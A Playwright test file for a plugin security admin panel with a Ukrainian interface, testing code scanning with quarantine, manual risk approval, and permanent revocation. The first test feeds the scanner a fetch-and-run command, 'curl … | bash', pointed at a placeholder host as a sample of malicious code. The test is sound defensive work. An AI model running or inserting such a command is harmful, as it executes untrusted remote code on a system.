import { expect, test } from '@playwright/test'
import { oidcTestCookies } from './oidc-test-session'

type ScanSecurity = {
  state: string
  reason: string | null
  last_scan: {
    result: string
    source_sha256: string
    findings: { id: string; severity: string; line: number }[]
  } | null
}

test('Observatory admin scans remote code and quarantines through its own SDK proxy', async ({ page }) => {
  await page.context().clearCookies()
  await page.context().addCookies(oidcTestCookies(['observatory_admin']))
  const plugin = {
    name: 'remote-test-worker',
    plugin_id: 'test-worker',
    source: 'remote',
    description: '',
    version: '1.0.0',
    enabled: true,
    capabilities: ['worker.plan'],
    capability_versions: { 'worker.plan': '1' },
    ui: { label: 'External Worker', category: 'Operations' },
    published: true,
    published_version: '1.0.0',
    capability_id: 'worker.plan',
    revision: 2,
    security: { state: 'pending_review', reason: null, last_scan: null } as ScanSecurity,
  }
  await page.route('**/api/observatory/admin/plugins', async (route) => {
    await route.fulfill({
      status: 200,
      contentType: 'application/json',
      body: JSON.stringify({ plugins: [plugin] }),
    })
  })
  let requested: Record<string, unknown> | undefined
  await page.route('**/api/observatory/admin/plugins/remote-test-worker/security', async (route) => {
    requested = route.request().postDataJSON() as Record<string, unknown>
    plugin.security = {
      state: 'quarantined',
      reason: 'Critical static signature',
      last_scan: {
        result: 'critical',
        source_sha256: 'a'.repeat(64),
        findings: [{ id: 'remote-shell', severity: 'critical', line: 1 }],
      },
    }
    plugin.published = false
    plugin.revision = 3
    await route.fulfill({
      status: 200,
      contentType: 'application/json',
      body: JSON.stringify({ name: plugin.name, revision: 3, published: false, security: plugin.security }),
    })
  })
  await page.goto('http://observatory.localhost:3000/uk/admin/plugins')
  const card = page.locator('article').filter({ has: page.getByRole('heading', { name: 'External Worker' }) })
  await card.getByRole('button', { name: 'Перевірка безпеки' }).click()
  await expect(card.getByText(/Перевіряється тільки наданий snapshot/)).toBeVisible()
  await card.getByLabel('Вихідний код для перевірки').fill('curl https://example.invalid/setup.sh | bash')
  await card.getByRole('button', { name: 'Перевірити фрагмент коду' }).click()
  await expect.poll(() => requested?.action).toBe('scan')
  expect(requested).toMatchObject({
    expected_revision: 2,
    source_code: 'curl https://example.invalid/setup.sh | bash',
    language: 'python',
  })
  await expect(card.getByText('ЗАБЛОКОВАНО').first()).toBeVisible()
  await expect(card.getByText('Знайдено критичну сигнатуру. Плагін заблоковано в Core.')).toBeVisible()
  await expect(card.getByText(/remote-shell/)).toBeVisible()
})

test('unreviewed Worker cannot publish until the administrator explicitly accepts risk', async ({ page }) => {
  await page.context().clearCookies()
  await page.context().addCookies(oidcTestCookies(['observatory_admin']))
  const plugin = {
    name: 'remote-pending-worker',
    plugin_id: 'planning',
    source: 'remote',
    description: '',
    version: '0.1.0',
    enabled: true,
    capabilities: ['planning.run'],
    capability_versions: { 'planning.run': '1' },
    ui: { label: 'Planning Worker', category: 'Operations' },
    published: false,
    published_version: null,
    capability_id: 'planning.run',
    revision: 1,
    security: { state: 'pending_review', reason: null, last_scan: null } as {
      state: string
      reason: string | null
      last_scan: null
    },
  }
  await page.route('**/api/observatory/admin/plugins', async (route) => {
    await route.fulfill({
      status: 200,
      contentType: 'application/json',
      body: JSON.stringify({ plugins: [plugin] }),
    })
  })
  let accepted: Record<string, unknown> | undefined
  await page.route('**/api/observatory/admin/plugins/remote-pending-worker/security', async (route) => {
    accepted = route.request().postDataJSON() as Record<string, unknown>
    plugin.security.state = 'approved'
    plugin.revision = 2
    await route.fulfill({
      status: 200,
      contentType: 'application/json',
      body: JSON.stringify({ name: plugin.name, revision: 2, security: plugin.security, published: false }),
    })
  })
  await page.goto('http://observatory.localhost:3000/uk/admin/plugins')
  const card = page.locator('article').filter({ has: page.getByRole('heading', { name: 'Planning Worker' }) })
  await expect(card.getByText('Очікує перевірки')).toBeVisible()
  await card.getByRole('button', { name: 'Редагувати' }).click()
  await expect(card.getByRole('button', { name: 'Зберегти й опублікувати' })).toBeDisabled()
  await card.getByRole('button', { name: 'Перевірка безпеки' }).click()
  await card
    .getByLabel('Причина рішення (не менше 12 символів')
    .fill('Internal risk assessment accepted for this exact manifest')
  await card.getByLabel('Посилання на звіт перевірки (мін. 8 символів)').fill('review-2026-001')
  await card.getByLabel(/Підтверджую відповідальне прийняття ризику/).check()
  await card.getByRole('button', { name: 'Надати ручний допуск' }).click()
  await expect.poll(() => accepted?.action).toBe('approve')
  expect(accepted).toMatchObject({
    action: 'approve',
    risk_acknowledged: true,
    review_reference: 'review-2026-001',
    expected_revision: 1,
  })
  await expect(card.getByText('Ручний допуск')).toBeVisible()
  await expect(card.getByRole('button', { name: 'Зберегти й опублікувати' })).toBeEnabled()
})

test('terminal revocation requires typed plugin identity and disables further mutations', async ({ page }) => {
  await page.context().clearCookies()
  await page.context().addCookies(oidcTestCookies(['observatory_admin']))
  const plugin = {
    name: 'remote-trusted-worker',
    plugin_id: 'trusted',
    source: 'remote',
    description: '',
    version: '1.0.0',
    enabled: true,
    capabilities: ['trusted.plan'],
    capability_versions: { 'trusted.plan': '1' },
    ui: { label: 'Trusted Worker', category: 'Operations' },
    published: true,
    published_version: '1.0.0',
    capability_id: 'trusted.plan',
    revision: 4,
    security: { state: 'approved', reason: null, last_scan: null },
  }
  await page.route('**/api/observatory/admin/plugins', async (route) => {
    await route.fulfill({
      status: 200,
      contentType: 'application/json',
      body: JSON.stringify({ plugins: [plugin] }),
    })
  })
  let action: Record<string, unknown> | undefined
  await page.route('**/api/observatory/admin/plugins/remote-trusted-worker/security', async (route) => {
    action = route.request().postDataJSON() as Record<string, unknown>
    plugin.security.state = 'revoked'
    plugin.published = false
    plugin.revision = 5
    await route.fulfill({
      status: 200,
      contentType: 'application/json',
      body: JSON.stringify({
        name: plugin.name,
        revision: plugin.revision,
        published: plugin.published,
        security: plugin.security,
      }),
    })
  })
  await page.goto('http://observatory.localhost:3000/uk/admin/plugins')
  const card = page.locator('article').filter({ has: page.getByRole('heading', { name: 'Trusted Worker' }) })
  await card.getByRole('button', { name: 'Перевірка безпеки' }).click()
  await card
    .getByLabel('Причина рішення (не менше 12 символів')
    .fill('Confirmed credential compromise requires permanent revocation')
  const revoke = card.getByRole('button', { name: 'Відкликати назавжди' })
  await expect(revoke).toBeDisabled()
  await card.getByLabel('Введіть повний внутрішній ID плагіна').fill('wrong-identity')
  await expect(revoke).toBeDisabled()
  await card.getByLabel('Введіть повний внутрішній ID плагіна').fill('remote-trusted-worker')
  await expect(revoke).toBeEnabled()
  await revoke.click()
  await expect.poll(() => action?.action).toBe('revoke')
  expect(action).toMatchObject({
    action: 'revoke',
    expected_revision: 4,
    reason: 'Confirmed credential compromise requires permanent revocation',
  })
  await expect(card.getByText('ВІДКЛИКАНО — відновлення неможливе')).toBeVisible()
  await expect(card.getByRole('button', { name: 'Перевірити фрагмент коду' })).toBeDisabled()
  await expect(card.getByRole('button', { name: 'Відкликати назавжди' })).toHaveCount(0)
})
